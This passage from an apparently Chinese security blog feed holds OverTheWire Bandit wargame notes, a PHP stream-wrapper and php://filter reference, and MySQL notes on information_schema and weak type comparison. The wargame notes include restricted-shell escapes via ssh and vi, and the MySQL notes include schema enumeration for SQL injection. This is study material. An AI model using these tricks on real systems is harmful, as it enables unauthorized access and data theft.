<span class="operator">|</span>               <span class="number">42</span> <span class="operator">|</span> <span class="keyword">NULL</span>                  <span class="operator">|</span> YES         <span class="operator">|</span> text      <span class="operator">|</span>                    <span class="number">65535</span> <span class="operator">|</span>                  <span class="number">65535</span> <span class="operator">|</span>              <span class="keyword">NULL</span> <span class="operator">|</span>          <span class="keyword">NULL</span> <span class="operator">|</span>               <span class="keyword">NULL</span> <span class="operator">|</span> utf8               <span class="operator">|</span> utf8_bin        <span class="operator">|</span> text                              <span class="operator">|</span>            <span class="operator">|</span>       <span class="operator">|</span> <span class="keyword">select</span>,<span class="keyword">insert</span>,<span class="keyword">update</span>,<span class="keyword">references</span> <span class="operator">|</span>                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> <span class="keyword">user</span>       <span class="operator">|</span> password_expired       <span class="operator">|</span>               <span class="number">43</span> <span class="operator">|</span> N                     <span class="operator">|</span> <span class="keyword">NO</span>          <span class="operator">|</span> enum      <span class="operator">|</span>                        <span class="number">1</span> <span class="operator">|</span>                      <span class="number">3</span> <span class="operator">|</span>              <span class="keyword">NULL</span> <span class="operator">|</span>          <span class="keyword">NULL</span> <span class="operator">|</span>               <span class="keyword">NULL</span> <span class="operator">|</span> utf8               <span class="operator">|</span> utf8_general_ci <span class="operator">|</span> enum(<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>)                     <span class="operator">|</span>            <span class="operator">|</span>       <span class="operator">|</span> <span class="keyword">select</span>,<span class="keyword">insert</span>,<span class="keyword">update</span>,<span class="keyword">references</span> <span class="operator">|</span>                <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+--------------+------------+------------------------+------------------+-----------------------+-------------+-----------+--------------------------+------------------------+-------------------+---------------+--------------------+--------------------+-----------------+-----------------------------------+------------+-------+---------------------------------+----------------+</span></span><br><span class="line"><span class="number">43</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>###权限表<br>权限表主要有三个，分别为<code>USER_PRIVILEGES表</code>、<code>SCHEMA_PRIVILEGES表</code>、<code>TABLE_PRIVILEGES表</code>和<code>COLUMN_PRIVILEGES表</code>。学习方法同上！<br>##总结<br>通过information_schema表,我们可以在不知道数据库名、表名、列名的情况下进行数据查询。</p>
]]></content>
      <categories>
        <category>sqli</category>
      </categories>
  </entry>
  <entry>
    <title>OverTheWire: bandit notes</title>
    <url>/games/OverTheWire-bandit-notes.html</url>
    <content><![CDATA[<p>网址:<a href="https://overthewire.org/wargames/bandit/">https://overthewire.org/wargames/bandit/</a></p>
<p>目前就34个关卡,大部分比较容易,有几个需要一些搜索.</p>
<p>不写整体的writeup了,只写其中做的几个笔记</p>
<h2 id="find"><a href="#find" class="headerlink" title="find"></a>find</h2><p><code>find / -type f -user xxx -group yyy -size 33c ! -executable 2&gt;/dev/null -exec cat &#123;&#125; \;</code></p>
<h2 id="cut-x2F-awk"><a href="#cut-x2F-awk" class="headerlink" title="cut&#x2F;awk"></a>cut&#x2F;awk</h2><p><code>cat data.txt | grep millionth | cut -f 2</code></p>
<p><code>cat data.txt | grep millionth | awk &#39;&#123;print $2&#125;&#39;</code></p>
<h2 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h2><p><code>cat data.txt | sort | uniq -c | sort -nr | tail -n 1 | awk &#39;&#123;print $2&#125;&#39;</code></p>
<h2 id="strings"><a href="#strings" class="headerlink" title="strings"></a>strings</h2><p><code>cat data.txt | strings | grep =</code></p>
<h2 id="tr-for-rot13"><a href="#tr-for-rot13" class="headerlink" title="tr for rot13"></a>tr for rot13</h2><p><code>cat data.txt | strings | tr &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot; &quot;NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm&quot;</code></p>
<h2 id="xxd"><a href="#xxd" class="headerlink" title="xxd"></a>xxd</h2><p><code>xxd -r data.txt</code>: reverse hexdump output to bin</p>
<h2 id="zips"><a href="#zips" class="headerlink" title="zips"></a>zips</h2><p><code>gzip -d data -c &gt; data1</code><br><code>bzip2 -d data1</code><br><code>tar xvf data1.out</code></p>
<h2 id="openssl"><a href="#openssl" class="headerlink" title="openssl"></a>openssl</h2><p><code>openssl s_client -connect localhost:30001</code></p>
<h2 id="ssh-using-other-tty"><a href="#ssh-using-other-tty" class="headerlink" title="ssh using other tty"></a>ssh using other tty</h2><p><code>ssh -p 2220 -t bandit18@bandit.labs.overthewire.org /bin/sh</code></p>
<h2 id="vi-shell"><a href="#vi-shell" class="headerlink" title="vi shell"></a>vi shell</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">:set shell=/bin/bash</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure>

<h2 id="git"><a href="#git" class="headerlink" title="git"></a>git</h2><p><code>git log -p -2</code><br><code>git diff commitid1 commitid2</code></p>
<p>switch to other branch</p>
<p><code>git remote show</code> &#x3D;&#x3D;&gt; shows the origin</p>
<p><code>git remote show origin</code> &#x3D;&#x3D;&gt; shows remote branches</p>
<p><code>git checkout dev</code> &#x3D;&#x3D;&gt; switch to dev branch</p>
<p><code>git show --name-only secret</code> &#x3D;&#x3D;&gt; shows the content of tag secret</p>
<p><code>git show-ref --tags -d</code> &#x3D;&#x3D;&gt; lists tags with their commits,  the -d in order to dereference the annotated tag object (which have their own commit SHA1) and display the actual tagged commit.</p>
<p><code>git show --name-only &lt;aTag&gt;</code> &#x3D;&#x3D;&gt;  list the tag and associated commit</p>
<h2 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h2><p><code>$0</code> &#x3D;&#x3D;&gt; the shell name or script name</p>
<p><img src="/images/pasted-12.png" alt="upload successful"></p>
]]></content>
      <categories>
        <category>games</category>
      </categories>
      <tags>
        <tag>overthewire</tag>
        <tag>bandit</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP Wrappers</title>
    <url>/web-sec/PHP-Wrappers.html</url>
    <content><![CDATA[<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><ul>
<li>file:&#x2F;&#x2F; — 访问本地文件系统</li>
<li>http:&#x2F;&#x2F; — 访问 HTTP(s) 网址</li>
<li>ftp:&#x2F;&#x2F; — 访问 FTP(s) URLs</li>
<li><strong>php:&#x2F;&#x2F; — 访问各个输入&#x2F;输出流（I&#x2F;O streams）</strong></li>
<li>zlib:&#x2F;&#x2F; — 压缩流</li>
<li>data:&#x2F;&#x2F; — 数据（RFC 2397）</li>
<li>glob:&#x2F;&#x2F; — 查找匹配的文件路径模式</li>
<li>phar:&#x2F;&#x2F; — PHP 归档</li>
<li>ssh2:&#x2F;&#x2F; — Secure Shell 2</li>
<li>rar:&#x2F;&#x2F; — RAR</li>
<li>ogg:&#x2F;&#x2F; — 音频流</li>
<li>expect:&#x2F;&#x2F; — 处理交互式的流</li>
</ul>
<h2 id="php-x2F-x2F"><a href="#php-x2F-x2F" class="headerlink" title="php:&#x2F;&#x2F;"></a>php:&#x2F;&#x2F;</h2><p>直接访问PHP进程的输入或者输出流：</p>
<ul>
<li><code>php://stdin</code>：只读</li>
<li><code>php://stdout</code>：只写</li>
<li><code>php://stderr</code>：只写</li>
</ul>
<h2 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h2><p><code>php://input</code>是可以访问请求的原始数据的只读流。</p>
<p><code>POST</code>请求的情况下，最好使用<code>php://input</code>来替代<code>$_HTTP_RAW_POST_DATA</code>，因为它不依赖于特定的<code>php.ini</code>指令。</p>
<p><code>enctype=&quot;multipart/form-data&quot;</code>的时候<code>php://input</code>是无效的。</p>
<h2 id="php-x2F-x2F-output"><a href="#php-x2F-x2F-output" class="headerlink" title="php:&#x2F;&#x2F;output"></a>php:&#x2F;&#x2F;output</h2><p><code>php://output</code>是一个只写的数据流，允许你以<code>print</code>和<code>echo</code>一样的方式写入到输出缓冲区。</p>
<h2 id="php-x2F-x2F-fd"><a href="#php-x2F-x2F-fd" class="headerlink" title="php:&#x2F;&#x2F;fd"></a>php:&#x2F;&#x2F;fd</h2><p><code>php://fd</code>允许直接访问指定的文件描述符，如<code>php://fd/3</code>引用了文件描述符3。</p>
<h2 id="php-x2F-x2F-memory和php-x2F-x2F-temp"><a href="#php-x2F-x2F-memory和php-x2F-x2F-temp" class="headerlink" title="php:&#x2F;&#x2F;memory和php:&#x2F;&#x2F;temp"></a>php:&#x2F;&#x2F;memory和php:&#x2F;&#x2F;temp</h2><p><code>php://memory</code>总是把数据存储在内存中</p>
<p><code>php://temp</code>会在内存量达到预定义的限制之后（默认2M）存入临时文件中。临时文件位置的决定和<code>sys_get_temp_dir()</code>的方式一致。</p>
<h2 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h2><p><code>php://filter</code>是一种元封装器，设计用于数据流打开时的筛选过滤应用。这对于一体式的文件函数非常有用，类似<code>readfile()</code>、<code>file()</code>和<code>file_get_contents()</code>，在数据流内容读取之前没有机会应用其他过滤器。</p>
<p><code>php://filter</code>目标使用一下的参数作为它路径的一部分。</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>resource&#x3D;&lt;要过滤的数据流&gt;</td>
<td>这个参数是必须的。它指定了你要筛选过滤的数据流。</td>
</tr>
<tr>
<td>read&#x3D;&lt;读链的筛选列表&gt;</td>
<td>可选参数。可以设定一个或多个过滤器名称，以管道符<code>/</code>分隔。</td>
</tr>
<tr>
<td>write&#x3D;&lt;写链的筛选列表&gt;</td>
<td>可选参数。可以设定一个或多个过滤器名称，以管道符<code>/</code>分隔。</td>
</tr>
<tr>
<td>&lt;; 两个链的筛选列表&gt;</td>
<td>任何没有以<code>read=</code>或<code>write=</code>作为前缀的筛选器列表会视情况应用于读链或写链。</td>
</tr>
</tbody></table>
<p><strong>封装协议摘要（针对<code>php://filter</code>，参考被筛选的封装器</strong></p>
<table>
<thead>
<tr>
<th>属性</th>
<th>支持</th>
</tr>
</thead>
<tbody><tr>
<td>受限于<code>allow_url_fopen</code></td>
<td>No</td>
</tr>
<tr>
<td>受限于<code>allow_url_include</code></td>
<td>仅<code>php://input</code>、<code>php://stdin</code>、<code>php://memory</code>、<code>php://temp</code></td>
</tr>
<tr>
<td>允许读取</td>
<td>仅<code>php://stdin</code>、<code>php://input</code>、<code>php://fd</code>、<code>php://memory</code>、<code>php://temp</code></td>
</tr>
<tr>
<td>允许写入</td>
<td>仅<code>php://stdout</code>、<code>php://stderr</code>、<code>php://output</code>、<code>php://fd</code>、<code>php://memory</code>、<code>php://temp</code></td>
</tr>
<tr>
<td>允许追加</td>
<td>同写入</td>
</tr>
<tr>
<td>允许同时读写</td>
<td>仅<code>php://fd</code>、<code>php://memory</code>、<code>php://temp</code></td>
</tr>
<tr>
<td>支持<code>stat()</code></td>
<td>仅<code>php://memory</code>、<code>php://temp</code></td>
</tr>
<tr>
<td>支持<code>unlink()</code></td>
<td>No</td>
</tr>
<tr>
<td>支持<code>rename()</code></td>
<td>No</td>
</tr>
<tr>
<td>支持<code>mkdir()</code></td>
<td>No</td>
</tr>
<tr>
<td>支持<code>rmdir()</code></td>
<td>No</td>
</tr>
<tr>
<td>仅支持<code>stream_select()</code></td>
<td><code>php://stdin</code>、<code>php://stdout</code>、<code>php://stderr</code>、<code>php://fd</code>、<code>php://temp</code></td>
</tr>
</tbody></table>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*	等同于</span></span><br><span class="line"><span class="comment">	readfile(&quot;http://www.a.com&quot;);</span></span><br><span class="line"><span class="comment">	实际上没有指定过滤器</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">readfile</span>(<span class="string">&quot;php://filter/resource=http://www.a.com&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	采用给一个或</span></span><br><span class="line"><span class="comment">		以管道符 | 分隔的</span></span><br><span class="line"><span class="comment">	多个过滤器</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/*以大写字母输入*/</span></span><br><span class="line"><span class="title function_ invoke__">readfile</span>(<span class="string">&quot;php://filter/read=string.toupper/resource=http://www.a.com&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*转换成大写，再使用ROT13加密之后*/</span></span><br><span class="line"><span class="title function_ invoke__">readfile</span>(<span class="string">&quot;php://filter/read=string.toupper|string.rot13/resource=http://www.a.com&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*关于管道顺序，总是从做往右做处理*/</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	base64_encode(test.txt) =&gt; test2.txt</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;string -&gt; toupper -&gt; base64-encode: &quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">readfile</span>(<span class="string">&quot;php://filter/read=string.toupper|convert.base64-encode/resource=test.txt&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;reversed process: &quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">readfile</span>(<span class="string">&quot;php://filter/read=convert.base64-decode|string.tolower/resource=test2.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	通过 rot13 过滤器筛选出字符 &quot;Hello World&quot;</span></span><br><span class="line"><span class="comment">	然后写入当前目录下的 test.txt</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;php://filter/write=string.rot13/resource=test.txt&quot;</span>, <span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="可用过滤器列表"><a href="#可用过滤器列表" class="headerlink" title="可用过滤器列表"></a>可用过滤器列表</h3><blockquote>
<p>It is worth noting a slight asymmetry between stream_filter_append() and stream_filter_prepend(). Every PHP stream contains a small read buffer where it stores blocks of data retrieved from the filesystem or other resource in order to process data in the most efficient manner. As soon as data is pulled from the resource into the stream’s internal buffer, it is immediately processed through any attached filters whether the PHP application is actually ready for the data or not. If data is sitting in the read buffer when a filter is appended, this data will be immediately processed through that filter making the fact that it was sitting in the buffer seem transparent. However, if data is sitting in the read buffer when a filter is prepended, this data will NOT be processed through that filter. It will instead wait until the next block of data is retrieved from the resource.</p>
</blockquote>
<h4 id="字符串过滤器"><a href="#字符串过滤器" class="headerlink" title="字符串过滤器"></a>字符串过滤器</h4><ul>
<li><code>string.rot13</code>：使用rot13对流数据进行加密，相当于<code>str_rot13()</code>函数。</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;php://output&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">stream_filter_append</span>(<span class="variable">$fp</span>, <span class="string">&#x27;string.rot13&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&quot;This is a test&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>string.toupper</code>：大写</li>
<li><code>string.tolower</code>：小写</li>
<li><code>string.strip_tags</code>：参考<code>strip_tags()</code>函数</li>
</ul>
<h4 id="转换过滤器"><a href="#转换过滤器" class="headerlink" title="转换过滤器"></a>转换过滤器</h4><p>具体用法参考对应函数名。</p>
<ul>
<li><code>convert.base64-encode</code></li>
<li><code>convert.base64-decode</code></li>
<li><code>convert.quoted-printable-encode</code></li>
<li><code>convert.quoted-printable-decode</code></li>
<li><code>convert.iconv.*</code></li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;php://output&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">stream_filter_append</span>(<span class="variable">$fp</span>, <span class="string">&#x27;convert.iconv.utf-16le.utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&quot;T\0h\0i\0s\0 \0i\0s\0 \0a\0 \0t\0e\0s\0t\0.\0\n\0&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">Outputs: This is a test.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="压缩过滤器"><a href="#压缩过滤器" class="headerlink" title="压缩过滤器"></a>压缩过滤器</h4><p>压缩过滤器不产生命令行工具如<code>gzip</code>的头和尾信息。知识压缩和解压数据流中的有效载荷部分。</p>
<ul>
<li><code>zlib.deflate</code>和<code>zlib.inflate</code></li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$params</span> = <span class="keyword">array</span>(<span class="string">&#x27;level&#x27;</span> =&gt; <span class="number">6</span>, <span class="string">&#x27;window&#x27;</span> =&gt; <span class="number">15</span>, <span class="string">&#x27;memory&#x27;</span> =&gt; <span class="number">9</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$original_text</span> = <span class="string">&quot;This is a test.\nThis is only a test.\nThis is not an important string.\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;The original text is &quot;</span> . <span class="title function_ invoke__">strlen</span>(<span class="variable">$original_text</span>) . <span class="string">&quot; characters long.\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;test.deflated&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">stream_filter_append</span>(<span class="variable">$fp</span>, <span class="string">&#x27;zlib.deflate&#x27;</span>, STREAM_FILTER_WRITE, <span class="variable">$params</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$original_text</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;The compress file is &quot;</span> . <span class="title function_ invoke__">filesize</span>(<span class="string">&#x27;test.deflated&#x27;</span>) . <span class="string">&quot; bytes long.\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;The original text was:\n&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">readfile</span>(<span class="string">&#x27;php://filter/zlib.inflate/resource=test.deflated&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Generates output:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The original text is 70 characters long.</span></span><br><span class="line"><span class="comment">The compressed file is 56 bytes long.</span></span><br><span class="line"><span class="comment">The original text was:</span></span><br><span class="line"><span class="comment">This is a test.</span></span><br><span class="line"><span class="comment">This is only a test.</span></span><br><span class="line"><span class="comment">This is not an important string.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	To read a gzip encoded stream from http</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="variable">$opts</span> = [</span><br><span class="line">    <span class="string">&quot;http&quot;</span> =&gt; [</span><br><span class="line">        <span class="string">&quot;method&quot;</span> =&gt; <span class="string">&quot;GET&quot;</span>,</span><br><span class="line">        <span class="string">&quot;header&quot;</span> =&gt; [<span class="string">&quot;Accept-Encoding: gzip&quot;</span>],</span><br><span class="line">    ]</span><br><span class="line">];</span><br><span class="line"><span class="variable">$ctx</span> = <span class="title function_ invoke__">stream_context_create</span>(<span class="variable">$opts</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;http://php.net&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="literal">false</span>, <span class="variable">$ctx</span>);</span><br><span class="line"><span class="comment">//check stream_get_meta_data($f)[&quot;wrapper_data&quot;] has &quot;Content-Encoding: gzip&quot;</span></span><br><span class="line"><span class="title function_ invoke__">stream_filter_append</span>(<span class="variable">$f</span>, <span class="string">&quot;zlib.inflate&quot;</span>, STREAM_FILTER_READ, [<span class="string">&quot;window&quot;</span> =&gt; <span class="number">30</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">stream_get_contents</span>(<span class="variable">$f</span>); <span class="comment">// any stream processing</span></span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$f</span>);</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>bzip2.compress</code>和<code>bzip2.decompress</code></li>
</ul>
<h4 id="加密过滤器"><a href="#加密过滤器" class="headerlink" title="加密过滤器"></a>加密过滤器</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//用 3DES 将文件加密输出</span></span><br><span class="line"><span class="variable">$passphrase</span> = <span class="string">&#x27;My secret&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Turn a human readable passphrase</span></span><br><span class="line"><span class="comment"> * into a reproducable iv/key pair</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="variable">$iv</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="string">&#x27;iv&#x27;</span>.<span class="variable">$passphrase</span>, <span class="literal">true</span>), <span class="number">0</span>, <span class="number">8</span>);</span><br><span class="line"><span class="variable">$key</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="string">&#x27;pass1&#x27;</span>.<span class="variable">$passphrase</span>, <span class="literal">true</span>) .</span><br><span class="line">               <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;pass2&#x27;</span>.<span class="variable">$passphrase</span>, <span class="literal">true</span>), <span class="number">0</span>, <span class="number">24</span>);</span><br><span class="line"><span class="variable">$opts</span> = <span class="keyword">array</span>(<span class="string">&#x27;iv&#x27;</span>=&gt;<span class="variable">$iv</span>, <span class="string">&#x27;key&#x27;</span>=&gt;<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;secert-file.enc&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">stream_filter_append</span>(<span class="variable">$fp</span>, <span class="string">&#x27;mcrypt.tripledes&#x27;</span>, STREAM_FILTER_WRITE, <span class="variable">$opts</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&#x27;Secret secret secret data&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//读取加密的文件</span></span><br><span class="line"><span class="variable">$passphrase</span> = <span class="string">&#x27;My secret&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Turn a human readable passphrase</span></span><br><span class="line"><span class="comment"> * into a reproducable iv/key pair</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="variable">$iv</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="string">&#x27;iv&#x27;</span>.<span class="variable">$passphrase</span>, <span class="literal">true</span>), <span class="number">0</span>, <span class="number">8</span>);</span><br><span class="line"><span class="variable">$key</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="string">&#x27;pass1&#x27;</span>.<span class="variable">$passphrase</span>, <span class="literal">true</span>) .</span><br><span class="line">               <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;pass2&#x27;</span>.<span class="variable">$passphrase</span>, <span class="literal">true</span>), <span class="number">0</span>, <span class="number">24</span>);</span><br><span class="line"><span class="variable">$opts</span> = <span class="keyword">array</span>(<span class="string">&#x27;iv&#x27;</span>=&gt;<span class="variable">$iv</span>, <span class="string">&#x27;key&#x27;</span>=&gt;<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;secert-file.enc&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">stream_filter_append</span>(<span class="variable">$fp</span>, <span class="string">&#x27;mdecrypt.tripledes&#x27;</span>, STREAM_FILTER_WRITE, <span class="variable">$opts</span>);</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">rtrim</span>(<span class="title function_ invoke__">stream_get_contents</span>(<span class="variable">$fp</span>));</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$data</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>web-sec</category>
      </categories>
  </entry>
  <entry>
    <title>MySQL条件等号的异常</title>
    <url>/sqli/MySQL%E6%9D%A1%E4%BB%B6%E7%AD%89%E5%8F%B7%E7%9A%84%E5%BC%82%E5%B8%B8.html</url>
    <content><![CDATA[<blockquote>
<p>敬原作者（应该是原作者，如有错误，请指正）<br><a href="http://www.wupco.cn/?p=93" title="来自Wupco&#39;s Blog">来自Wupco’s Blog</a></p>
</blockquote>
<p>##根源<br>MySQL WHERE语句中，等号<code>=</code>通常作为判断条件，然而这个等号却是<code>弱类型</code>的判断，如果忽略了这一点，很容易造成安全问题，以下是原作者整理的匪夷所思的<code>相等</code>。</p>
<p>##字符型和数字型<br>MySQL的等号同PHP一样，对等号两端不同的数据类型都有强制类型转换，如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> use mysql</span><br><span class="line">Reading <span class="keyword">table</span> information <span class="keyword">for</span> completion <span class="keyword">of</span> <span class="keyword">table</span> <span class="keyword">and</span> <span class="keyword">column</span> names</span><br><span class="line">You can turn off this feature <span class="keyword">to</span> <span class="keyword">get</span> a quicker startup <span class="keyword">with</span> <span class="operator">-</span>A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="keyword">user</span> name <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="number">1</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="operator">|</span> name             <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="operator">|</span> root             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> root             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> root             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> debian<span class="operator">-</span>sys<span class="operator">-</span>maint <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> root             <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="number">5</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
<p>但却没有PHP的弱类型判断（<strong>此处本人不明白，为什么以下语句能说明这句话，望大神指点</strong>）</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="keyword">user</span> name <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="number">0.99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999</span><span class="operator">=</span><span class="number">1</span>;</span><br><span class="line"><span class="keyword">Empty</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
<p>这个的应用范围很局限，但是又不得忽视，所以开发者在字段的数据类型的选择以及SQL语句的构造方面，要多多注意，防止等号两边类型不相同导致的漏洞。</p>
